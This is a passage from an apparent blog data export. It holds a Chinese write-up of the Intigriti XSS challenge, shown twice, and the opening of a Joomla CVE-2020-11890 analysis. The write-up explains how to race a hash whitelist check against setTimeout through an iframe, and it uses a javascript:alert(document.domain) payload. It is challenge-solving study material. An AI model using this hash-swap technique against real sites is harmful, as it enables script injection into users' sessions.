剩下几行可以在5秒内执行完，onload如期执行，5秒后的location.hash.substr(1)就变成了javascript:alert(document.domain)\n\n但是挑战中的setTimeout并没有设置计时时间，采用默认值\n\n默认计时时间是多久呢？我查看了下相关资料\n\n![41e629b599ba7c85515335076736935c.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175459-4df6eb0c-128e-1.png)\n\n![555df4d09d621fea8a08cb206353818d.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175507-532106ee-128e-1.png)\n\n可见如本次题目中这样，并不设置计时时间，留给我们的最少有4ms\n\n实际上，我测了一下在我的环境下，这个时间大概多久。使用如下代码\n\n![138620a7c0a940b191e0547c7a887dbe.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175514-576e88a2-128e-1.png)\n\n![b66663e54b9f3b29e2f4ea731f7baeb2.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175520-5ad797d6-128e-1.png)\n\n尽管测试代码不是很精准，但大概有59毫秒\n\n而执行index.php后续的仅剩的几行代码，几乎用不了这么多时间\n\n在0.059秒内，只要后续几行代码被执行，onload顺利触发，锚点被修改，我们就可以结题成功了\n\n关于其他解法的一些想法\n----------------------\n\n我发现，有些师傅使用如下思路\n\n![f5378d820f0f6ae1de8efd687545374e.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175534-633c1398-128e-1.png)\n\n想通过超长的锚点值来拖延目标程序运行时间\n\n我们再来看下原题\n\n![2dd50a171220bc768ad3927d91fc2233.png](https://xzfile.aliyuncs.com/media/upload/picture/20191129175548-6b94ddfe-128e-1.png)\n\n既然这种解法是通过onload来改变锚点值，那么影响结果的因素如上文分析，只有setTimeout的计时时间和setTimeout计时开始后，执行完后续代码以至onload触发的时间\n\n这里的超长锚点值，并不能影响这两者中的任何一个，因此我私自认为应该是没有用的，欢迎感兴趣的师傅一起讨论。","slug":"Intigriti-XSS","published":1,"updated":"2020-10-28T01:06:00.368Z","_id":"ckgrozu8i000vwsa9dyx0g8pg","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg\" alt=\"7f3c6b234a0a4177e0235f746e8b284d.jpg\"></p>\n<p>前些日子Intigriti出了一道关于XSS的题目。目前比赛已经结束了，但是仍可以通过下面地址体验一下：<br><a href=\"https://challenge.intigriti.io/\">https://challenge.intigriti.io</a></p>\n<p>题目很简单，就是从上图中的代码中找到xss漏洞，即可获胜</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>分析一下这段代码，为了方便测试，我把这个xss挑战代码放到了我本地<em><a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a></em>地址</p>\n<p>首先在第二行处有个一个白名单，如下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175133-d36fea8c-128d-1.png\" alt=\"7cfcb028a601cb6d3e6e4278adbcfbb8.png\"></p>\n<p>Whitelist中定义了两个域名，’intigriti.com’与’intigriti.io’。这个白名单在下文代码中会用到</p>\n<p>接着通过location.hash.substr(1)取出字符串，并生成一个URL对象赋给url变量</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175149-dce97ac4-128d-1.png\" alt=\"033bf0112f5402dc2cb1ba95fed6475a.png\"></p>\n<p>window.location.hash获取url中的锚点，简单来说就是url中#号以及#号后的部分</p>\n<p>例如访问：<a href=\"http://127.0.0.1/xssctf/hash.html#hashtest\">http://127.0.0.1/xssctf/hash.html#hashtest</a></p>\n<p>hash.html代码如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175207-e7e61176-128d-1.png\" alt=\"e62dc97c301f191973dd53600d021165.png\"></p>\n<p>控制台输出如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175217-eda8f290-128d-1.png\" alt=\"027e0dfd09d30936e54fe104cc314388.png\"></p>\n<p>值得注意的是：锚点中的内容仅供浏览器定位资源，并不会随着请求发送给目标服务器的</p>\n<p>注意下图，请求中并不包含锚点#hashtest内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175231-f5f7e21c-128d-1.png\" alt=\"9024099cefc4390d08d1a7f77005c855.png\"></p>\n<p>location.hash.substr(1)实际上是用来获取井号之后的字符串，如上例获取的字符串则是hashtest</p>\n<p>接下来看原题</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175238-fa078876-128d-1.png\" alt=\"1003f667dd93047f53b91d87daa79ff5.png\"></p>\n<p>程序在上图第四行红框中检查url中的hostname属性，是否在whitelist中</p>\n<p>因此我们如果想让程序进入此处if分支，需要构造#<a href=\"http://intigriti.io/\">http://intigriti.io</a> 类似的锚点值</p>\n<p>对应的url应该类似<em><a href=\"http://127.0.0.1/xssctf/index.html#http://intigriti.io\">http://127.0.0.1/xssctf/index.html#http://intigriti.io</a></em></p>\n<p>在进入if分支后，程序接着将url.href通过encodeURIComponent编码，并document.write下来，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175255-04955304-128e-1.png\" alt=\"f6ff03708da5bffd8b1ab6a1c29c29d8.png\"></p>\n<p>上图第5行处，由于这里url.href被编码，导致无法利用，所以这里不存在利用点</p>\n<p>接着看下面这块</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175307-0b627130-128e-1.png\" alt=\"520e7ffd4da03d8f550b4267ebf9b843.png\"></p>\n<p>在上图红框处，存在一个setTimeout方法，setTimeout方法用于在指定的毫秒数后调用函数或计算表达式，是一个计时器</p>\n<p>当计时结束后，执行上图第7行内容，再次使用location.hash.substr(1)读取锚点值并跳转。</p>\n<p>如果此时的锚点值为恶意的xss payload例如javascript:alert(document.domain)，跳转时则会产生xss漏洞</p>\n<p>那么如何使得程序在第三行处获的锚点值为白名单中的’intigriti.com’或’intigriti.io’</p>\n<p>但在第7行时再次获取时变成恶意的xss payload呢？</p>\n<p>其实思路有两种，这就对应了这道题的两个不同解法</p>\n<ol>\n<li>计算好时间，设计一个延时引信，等第一处location.hash.substr(1)一执行完就该锚点值</li>\n</ol>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175316-10fcc7f8-128e-1.png\" alt=\"52f83caa986cb944b54d5185b7998979.png\"></p>\n<p>这种思路只需要关心程序从加载到执行完上图红框处需要多少时间</p>\n<ol start=\"2\">\n<li>等这个脚本加载完毕，但setTimeout计时器时间未到，还未来得及执行第二处location.hash.substr(1)时修改锚点</li>\n</ol>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175329-184569de-128e-1.png\" alt=\"9c14b7769a38d4a88bd3832020d57896.png\"></p>\n<p>这种思路只需要关心程序从执行上图setTimeout计时器使计时器开始运作时，到脚本完全执行结束需要多少时间。后续会介绍为什么需要考虑这个时间</p>\n<p>如果想实现以上两种中途修改锚点的操作，可以使用HTML内联框架元素(&lt;iframe&gt;)。它能够将另一个HTML页面嵌入到当前页面中，当把我们的目标页面嵌入我们构造的恶意页面中，我们就可以通过修改src属性来修改锚点的值</p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><h3 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h3><p>我将本次题目代码放到了<a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a> ，下文里这个地址对应的就是这次题目在我本地的地址</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175336-1cdabdf0-128e-1.png\" alt=\"643426f63105138270301a9d3d072ce6.png\"></p>\n<p>解法一是通过估算出从<a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a> 被加载到第一处location.hash.substr(1)执行时的时间，通过估算这个时间(用X表示)，只要在这个时间之后，最理想的是执行后的一瞬间（因为再晚了第二处location.hash.substr(1)执行可就执行了），</p>\n<p>通过<br>document.getElementById(‘xss’).src把锚点改为#javascript:alert(document.domain)</p>\n<p>这样一来，当第二处location.hash.substr(1)执行时，获取的锚点值就会是#javascript:alert(document.domain) ，从而导致xss</p>\n<p>但是这个时间并不是很好计算，不能太早，也不能太晚</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175349-24c3e690-128e-1.png\" alt=\"c4cded328593c2b4b3367d1d171ad0ff.png\"></p>\n<p>上图红框处的200，只是一个示例值，实际中不一定是这个数字，具体算起来麻烦且很不稳定</p>\n<h3 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h3><p>在看第二种解法之前，先介绍一下onload事件</p>\n<p>onload 事件会在页面或图像加载完成后立即发生</p>\n<p>但从字面意义上，有点难以理解具体onload的执行时机：</p>\n<p>例如通过iframe嵌入一个页面，被嵌入的页面中有一个setTimeout计时器，onload是等待计时器计时结束，并执行完计时器内部的代码后再执行呢？还是</p>\n<p>等被嵌入的页面逐行执行结束，不需要等待被嵌入页面的计时器计时结束，执行执行。</p>\n<p>为了测验onload加载的时机，我做了如下实验</p>\n<p>Loadiframe.html 使用iframe来嵌入其他页面，代码如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175358-29bbdf2c-128e-1.png\" alt=\"d53edeeacb93c137b503063f18b213be.png\"></p>\n<p>Iframe.html 被嵌入的页面，其中有一个setTimeout计时器，计时5秒之后在控制台里打印”step 4”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175407-2f25f6c8-128e-1.png\" alt=\"ca858cc9ccfb155c89833d768f012c10.png\"></p>\n<p>实际结果如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175416-34d47540-128e-1.png\" alt=\"d09c0c5a62c0b6d0df37111ca6d18eab.png\"></p>\n<p>当Iframe.html中脚本被逐行加载完后，Onload并未等待step 4 打印，直接触发</p>\n<p>通过这个例子可以看出，当被加载的页面中存在计时器时，并不影响onload的执行。</p>\n<p>只要被加载的页面中脚本被逐行加载完毕，onload就触发。</p>\n<p>因此对应的解法如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175423-38f32892-128e-1.png\" alt=\"a4eb0c2c89f3859e5de62e36a8434b33.png\"></p>\n<p>程序执行到上图11行处时，index.html开始加载</p>\n<p>当index.html中脚本加载到下图第六行时，setTimeout计时器开始计时，在计时结束后执行location<br>= location.hash.substr(1);</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175434-3f142708-128e-1.png\" alt=\"c8197ce9964bf55b6f99df9081fec35f.png\"></p>\n<p>随后，脚本逐行执行。当index.html中脚本全部被执行完成后，恶意构造的页面中的onload被触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175441-43bc1a4a-128e-1.png\" alt=\"334dea30f093e7b1f82e2a3a2038c6fc.png\"></p>\n<p>上图红框处即为onload触发时的代码，此处代码修改锚点值，将其变为恶意的payload</p>\n<p>这种解题思路的核心在于，从index.html中setTimeout计时器启动开始，执行index.html中后续的代码的时间，即加载完毕index.html从而可以触发onload事件的时间，与setTimeout计时器设置时间的比较</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175449-485ee190-128e-1.png\" alt=\"8c02c6d8f97340b5b6042c49c7a862f7.png\"></p>\n<p>当setTimeout计时器设置时间比执行完上图红框处代码所需的时间长，则可顺利触发onload将锚点值更改，在计时结束后，计时器中代码获取的锚点值就变成了我们的payload</p>\n<p>但是如果setTimeout计时时间很短，index.html后续代码还未加载完，onload还未来的急触发，那利用就会失败</p>\n<p>举个例子：</p>\n<p>setTimeout设置的是5000，也就是5秒。当setTimeout这行代码被执行，计时开始后，如果index.html中剩下几行可以在5秒内执行完，onload如期执行，5秒后的location.hash.substr(1)就变成了javascript:alert(document.domain)</p>\n<p>但是挑战中的setTimeout并没有设置计时时间，采用默认值</p>\n<p>默认计时时间是多久呢？我查看了下相关资料</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175459-4df6eb0c-128e-1.png\" alt=\"41e629b599ba7c85515335076736935c.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175507-532106ee-128e-1.png\" alt=\"555df4d09d621fea8a08cb206353818d.png\"></p>\n<p>可见如本次题目中这样，并不设置计时时间，留给我们的最少有4ms</p>\n<p>实际上，我测了一下在我的环境下，这个时间大概多久。使用如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175514-576e88a2-128e-1.png\" alt=\"138620a7c0a940b191e0547c7a887dbe.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175520-5ad797d6-128e-1.png\" alt=\"b66663e54b9f3b29e2f4ea731f7baeb2.png\"></p>\n<p>尽管测试代码不是很精准，但大概有59毫秒</p>\n<p>而执行index.php后续的仅剩的几行代码，几乎用不了这么多时间</p>\n<p>在0.059秒内，只要后续几行代码被执行，onload顺利触发，锚点被修改，我们就可以结题成功了</p>\n<h2 id=\"关于其他解法的一些想法\"><a href=\"#关于其他解法的一些想法\" class=\"headerlink\" title=\"关于其他解法的一些想法\"></a>关于其他解法的一些想法</h2><p>我发现，有些师傅使用如下思路</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175534-633c1398-128e-1.png\" alt=\"f5378d820f0f6ae1de8efd687545374e.png\"></p>\n<p>想通过超长的锚点值来拖延目标程序运行时间</p>\n<p>我们再来看下原题</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175548-6b94ddfe-128e-1.png\" alt=\"2dd50a171220bc768ad3927d91fc2233.png\"></p>\n<p>既然这种解法是通过onload来改变锚点值，那么影响结果的因素如上文分析，只有setTimeout的计时时间和setTimeout计时开始后，执行完后续代码以至onload触发的时间</p>\n<p>这里的超长锚点值，并不能影响这两者中的任何一个，因此我私自认为应该是没有用的，欢迎感兴趣的师傅一起讨论。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175105-c2f5792e-128d-1.jpeg\" alt=\"7f3c6b234a0a4177e0235f746e8b284d.jpg\"></p>\n<p>前些日子Intigriti出了一道关于XSS的题目。目前比赛已经结束了，但是仍可以通过下面地址体验一下：<br><a href=\"https://challenge.intigriti.io/\">https://challenge.intigriti.io</a></p>\n<p>题目很简单，就是从上图中的代码中找到xss漏洞，即可获胜</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>分析一下这段代码，为了方便测试，我把这个xss挑战代码放到了我本地<em><a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a></em>地址</p>\n<p>首先在第二行处有个一个白名单，如下图红框处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175133-d36fea8c-128d-1.png\" alt=\"7cfcb028a601cb6d3e6e4278adbcfbb8.png\"></p>\n<p>Whitelist中定义了两个域名，’intigriti.com’与’intigriti.io’。这个白名单在下文代码中会用到</p>\n<p>接着通过location.hash.substr(1)取出字符串，并生成一个URL对象赋给url变量</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175149-dce97ac4-128d-1.png\" alt=\"033bf0112f5402dc2cb1ba95fed6475a.png\"></p>\n<p>window.location.hash获取url中的锚点，简单来说就是url中#号以及#号后的部分</p>\n<p>例如访问：<a href=\"http://127.0.0.1/xssctf/hash.html#hashtest\">http://127.0.0.1/xssctf/hash.html#hashtest</a></p>\n<p>hash.html代码如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175207-e7e61176-128d-1.png\" alt=\"e62dc97c301f191973dd53600d021165.png\"></p>\n<p>控制台输出如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175217-eda8f290-128d-1.png\" alt=\"027e0dfd09d30936e54fe104cc314388.png\"></p>\n<p>值得注意的是：锚点中的内容仅供浏览器定位资源，并不会随着请求发送给目标服务器的</p>\n<p>注意下图，请求中并不包含锚点#hashtest内容</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175231-f5f7e21c-128d-1.png\" alt=\"9024099cefc4390d08d1a7f77005c855.png\"></p>\n<p>location.hash.substr(1)实际上是用来获取井号之后的字符串，如上例获取的字符串则是hashtest</p>\n<p>接下来看原题</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175238-fa078876-128d-1.png\" alt=\"1003f667dd93047f53b91d87daa79ff5.png\"></p>\n<p>程序在上图第四行红框中检查url中的hostname属性，是否在whitelist中</p>\n<p>因此我们如果想让程序进入此处if分支，需要构造#<a href=\"http://intigriti.io/\">http://intigriti.io</a> 类似的锚点值</p>\n<p>对应的url应该类似<em><a href=\"http://127.0.0.1/xssctf/index.html#http://intigriti.io\">http://127.0.0.1/xssctf/index.html#http://intigriti.io</a></em></p>\n<p>在进入if分支后，程序接着将url.href通过encodeURIComponent编码，并document.write下来，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175255-04955304-128e-1.png\" alt=\"f6ff03708da5bffd8b1ab6a1c29c29d8.png\"></p>\n<p>上图第5行处，由于这里url.href被编码，导致无法利用，所以这里不存在利用点</p>\n<p>接着看下面这块</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175307-0b627130-128e-1.png\" alt=\"520e7ffd4da03d8f550b4267ebf9b843.png\"></p>\n<p>在上图红框处，存在一个setTimeout方法，setTimeout方法用于在指定的毫秒数后调用函数或计算表达式，是一个计时器</p>\n<p>当计时结束后，执行上图第7行内容，再次使用location.hash.substr(1)读取锚点值并跳转。</p>\n<p>如果此时的锚点值为恶意的xss payload例如javascript:alert(document.domain)，跳转时则会产生xss漏洞</p>\n<p>那么如何使得程序在第三行处获的锚点值为白名单中的’intigriti.com’或’intigriti.io’</p>\n<p>但在第7行时再次获取时变成恶意的xss payload呢？</p>\n<p>其实思路有两种，这就对应了这道题的两个不同解法</p>\n<ol>\n<li>计算好时间，设计一个延时引信，等第一处location.hash.substr(1)一执行完就该锚点值</li>\n</ol>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175316-10fcc7f8-128e-1.png\" alt=\"52f83caa986cb944b54d5185b7998979.png\"></p>\n<p>这种思路只需要关心程序从加载到执行完上图红框处需要多少时间</p>\n<ol start=\"2\">\n<li>等这个脚本加载完毕，但setTimeout计时器时间未到，还未来得及执行第二处location.hash.substr(1)时修改锚点</li>\n</ol>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175329-184569de-128e-1.png\" alt=\"9c14b7769a38d4a88bd3832020d57896.png\"></p>\n<p>这种思路只需要关心程序从执行上图setTimeout计时器使计时器开始运作时，到脚本完全执行结束需要多少时间。后续会介绍为什么需要考虑这个时间</p>\n<p>如果想实现以上两种中途修改锚点的操作，可以使用HTML内联框架元素(&lt;iframe&gt;)。它能够将另一个HTML页面嵌入到当前页面中，当把我们的目标页面嵌入我们构造的恶意页面中，我们就可以通过修改src属性来修改锚点的值</p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><h3 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h3><p>我将本次题目代码放到了<a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a> ，下文里这个地址对应的就是这次题目在我本地的地址</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175336-1cdabdf0-128e-1.png\" alt=\"643426f63105138270301a9d3d072ce6.png\"></p>\n<p>解法一是通过估算出从<a href=\"http://127.0.0.1/xssctf/index.html\">http://127.0.0.1/xssctf/index.html</a> 被加载到第一处location.hash.substr(1)执行时的时间，通过估算这个时间(用X表示)，只要在这个时间之后，最理想的是执行后的一瞬间（因为再晚了第二处location.hash.substr(1)执行可就执行了），</p>\n<p>通过<br>document.getElementById(‘xss’).src把锚点改为#javascript:alert(document.domain)</p>\n<p>这样一来，当第二处location.hash.substr(1)执行时，获取的锚点值就会是#javascript:alert(document.domain) ，从而导致xss</p>\n<p>但是这个时间并不是很好计算，不能太早，也不能太晚</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175349-24c3e690-128e-1.png\" alt=\"c4cded328593c2b4b3367d1d171ad0ff.png\"></p>\n<p>上图红框处的200，只是一个示例值，实际中不一定是这个数字，具体算起来麻烦且很不稳定</p>\n<h3 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h3><p>在看第二种解法之前，先介绍一下onload事件</p>\n<p>onload 事件会在页面或图像加载完成后立即发生</p>\n<p>但从字面意义上，有点难以理解具体onload的执行时机：</p>\n<p>例如通过iframe嵌入一个页面，被嵌入的页面中有一个setTimeout计时器，onload是等待计时器计时结束，并执行完计时器内部的代码后再执行呢？还是</p>\n<p>等被嵌入的页面逐行执行结束，不需要等待被嵌入页面的计时器计时结束，执行执行。</p>\n<p>为了测验onload加载的时机，我做了如下实验</p>\n<p>Loadiframe.html 使用iframe来嵌入其他页面，代码如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175358-29bbdf2c-128e-1.png\" alt=\"d53edeeacb93c137b503063f18b213be.png\"></p>\n<p>Iframe.html 被嵌入的页面，其中有一个setTimeout计时器，计时5秒之后在控制台里打印”step 4”</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175407-2f25f6c8-128e-1.png\" alt=\"ca858cc9ccfb155c89833d768f012c10.png\"></p>\n<p>实际结果如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175416-34d47540-128e-1.png\" alt=\"d09c0c5a62c0b6d0df37111ca6d18eab.png\"></p>\n<p>当Iframe.html中脚本被逐行加载完后，Onload并未等待step 4 打印，直接触发</p>\n<p>通过这个例子可以看出，当被加载的页面中存在计时器时，并不影响onload的执行。</p>\n<p>只要被加载的页面中脚本被逐行加载完毕，onload就触发。</p>\n<p>因此对应的解法如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175423-38f32892-128e-1.png\" alt=\"a4eb0c2c89f3859e5de62e36a8434b33.png\"></p>\n<p>程序执行到上图11行处时，index.html开始加载</p>\n<p>当index.html中脚本加载到下图第六行时，setTimeout计时器开始计时，在计时结束后执行location<br>= location.hash.substr(1);</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175434-3f142708-128e-1.png\" alt=\"c8197ce9964bf55b6f99df9081fec35f.png\"></p>\n<p>随后，脚本逐行执行。当index.html中脚本全部被执行完成后，恶意构造的页面中的onload被触发</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175441-43bc1a4a-128e-1.png\" alt=\"334dea30f093e7b1f82e2a3a2038c6fc.png\"></p>\n<p>上图红框处即为onload触发时的代码，此处代码修改锚点值，将其变为恶意的payload</p>\n<p>这种解题思路的核心在于，从index.html中setTimeout计时器启动开始，执行index.html中后续的代码的时间，即加载完毕index.html从而可以触发onload事件的时间，与setTimeout计时器设置时间的比较</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175449-485ee190-128e-1.png\" alt=\"8c02c6d8f97340b5b6042c49c7a862f7.png\"></p>\n<p>当setTimeout计时器设置时间比执行完上图红框处代码所需的时间长，则可顺利触发onload将锚点值更改，在计时结束后，计时器中代码获取的锚点值就变成了我们的payload</p>\n<p>但是如果setTimeout计时时间很短，index.html后续代码还未加载完，onload还未来的急触发，那利用就会失败</p>\n<p>举个例子：</p>\n<p>setTimeout设置的是5000，也就是5秒。当setTimeout这行代码被执行，计时开始后，如果index.html中剩下几行可以在5秒内执行完，onload如期执行，5秒后的location.hash.substr(1)就变成了javascript:alert(document.domain)</p>\n<p>但是挑战中的setTimeout并没有设置计时时间，采用默认值</p>\n<p>默认计时时间是多久呢？我查看了下相关资料</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175459-4df6eb0c-128e-1.png\" alt=\"41e629b599ba7c85515335076736935c.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175507-532106ee-128e-1.png\" alt=\"555df4d09d621fea8a08cb206353818d.png\"></p>\n<p>可见如本次题目中这样，并不设置计时时间，留给我们的最少有4ms</p>\n<p>实际上，我测了一下在我的环境下，这个时间大概多久。使用如下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175514-576e88a2-128e-1.png\" alt=\"138620a7c0a940b191e0547c7a887dbe.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175520-5ad797d6-128e-1.png\" alt=\"b66663e54b9f3b29e2f4ea731f7baeb2.png\"></p>\n<p>尽管测试代码不是很精准，但大概有59毫秒</p>\n<p>而执行index.php后续的仅剩的几行代码，几乎用不了这么多时间</p>\n<p>在0.059秒内，只要后续几行代码被执行，onload顺利触发，锚点被修改，我们就可以结题成功了</p>\n<h2 id=\"关于其他解法的一些想法\"><a href=\"#关于其他解法的一些想法\" class=\"headerlink\" title=\"关于其他解法的一些想法\"></a>关于其他解法的一些想法</h2><p>我发现，有些师傅使用如下思路</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175534-633c1398-128e-1.png\" alt=\"f5378d820f0f6ae1de8efd687545374e.png\"></p>\n<p>想通过超长的锚点值来拖延目标程序运行时间</p>\n<p>我们再来看下原题</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191129175548-6b94ddfe-128e-1.png\" alt=\"2dd50a171220bc768ad3927d91fc2233.png\"></p>\n<p>既然这种解法是通过onload来改变锚点值，那么影响结果的因素如上文分析，只有setTimeout的计时时间和setTimeout计时开始后，执行完后续代码以至onload触发的时间</p>\n<p>这里的超长锚点值，并不能影响这两者中的任何一个，因此我私自认为应该是没有用的，欢迎感兴趣的师傅一起讨论。</p>\n"},{"title":"Joomla提权漏洞（CVE-2020-11890）","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/381b525f3bbb2cc965a82b68e958dad.jpg","date":"2020-05-10T09:27:21.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n漏洞简介\n--------\n\n\n\n近日，joomla官方给出了一个安全公告。从公告可知Joomla! CMS versions 2.5.0 - 3.9.16版本在处理用户组时缺少对根用户组的检查，从而导致了一个提权漏洞的产生(CVE-2020-11890)。\n\n经过我分析之后发现，想要利用这个漏洞，必须先要有一个管理员账号，而这个漏洞的作用仅仅能将管理员提权为超级管理员。\n\n虽然这个漏洞看起来无比鸡肋，但是分析过程却其乐无穷：既了解joomla是如何实现用户组权限划分，又复习了下数据结构。总体上来说漏洞虽小，但分析过程还是很有研究与记录价值的。\n\n漏洞分析\n--------\n\n本次漏洞可以将joomla系统中的Administrator用户提权为Super Users。在分析漏洞前，我们来看一下Super Users与Administrator有什么区别：\n\n超级管理员 (Super 